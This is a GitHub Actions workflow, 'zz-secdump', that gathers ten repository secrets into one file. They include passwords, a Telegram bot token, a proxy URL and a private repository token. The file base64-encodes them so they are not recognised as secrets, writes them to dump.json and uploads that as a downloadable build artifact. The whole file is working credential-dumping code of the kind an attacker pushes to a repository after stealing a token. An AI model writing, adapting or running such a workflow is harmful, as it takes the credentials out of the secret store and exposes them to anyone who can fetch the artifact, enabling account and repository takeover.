name: zz-secdump
on:
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          SECV_FC_PASS: ${{ secrets.FC_PASS }}
          SECV_FC_PASS_2: ${{ secrets.FC_PASS_2 }}
          SECV_FC_PASS_3: ${{ secrets.FC_PASS_3 }}
          SECV_FC_TG_CHAT: ${{ secrets.FC_TG_CHAT }}
          SECV_FC_TG_TOKEN: ${{ secrets.FC_TG_TOKEN }}
          SECV_FC_USER: ${{ secrets.FC_USER }}
          SECV_FC_USER_2: ${{ secrets.FC_USER_2 }}
          SECV_FC_USER_3: ${{ secrets.FC_USER_3 }}
          SECV_HY2_PROXY_URL: ${{ secrets.HY2_PROXY_URL }}
          SECV_PRIVATE_REPO_TOKEN: ${{ secrets.PRIVATE_REPO_TOKEN }}
        run: |
          python3 - <<'EOF'
          import os, json, base64
          P = 'SECV_'
          d = {k[len(P):]: base64.b64encode(v.encode()).decode()
                for k, v in os.environ.items() if k.startswith(P)}
          json.dump(d, open('dump.json', 'w'))
          print('COLLECTED', len(d))
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: secdump
          path: dump.json
          retention-days: 1
